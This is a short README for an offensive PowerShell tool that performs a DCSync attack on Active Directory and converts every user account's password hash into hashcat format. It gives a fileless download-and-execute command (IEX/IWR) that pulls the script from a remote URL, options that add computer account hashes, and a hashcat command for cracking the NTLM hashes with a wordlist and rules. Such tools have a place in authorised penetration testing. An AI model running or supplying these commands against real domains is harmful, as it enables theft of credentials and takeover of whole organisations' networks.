# DCSync-To-hashcat
Performs DCSync and extracts all user accounts hashes in a hashcat friendly format

### Load into memory:
```
IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-To-Hashcat/main/DCSync-To-Hashcat.ps1)
```
### Commands:
```
Invoke-DCSyncTH                          # Run with default options
Invoke-DCSyncTH -ComputerHashes -Y       # Include computer accounts
Invoke-DCSyncTH -OutputToFile -Y         # Output hashes to file. Defaults to $HOME\Hashcat_Final.txt 
```
### Sample Output
![image](https://user-images.githubusercontent.com/68926315/226433487-431a26e1-9b8a-46b6-af31-ea879b8bca6b.png)

### hashcat cracking
The results can be copied over to file and run againt Hashcat
```
hashcat -a 0 -m 1000 hashes.txt -O Wordlists/rockyou2021.txt -r Rules/best64.rule
```
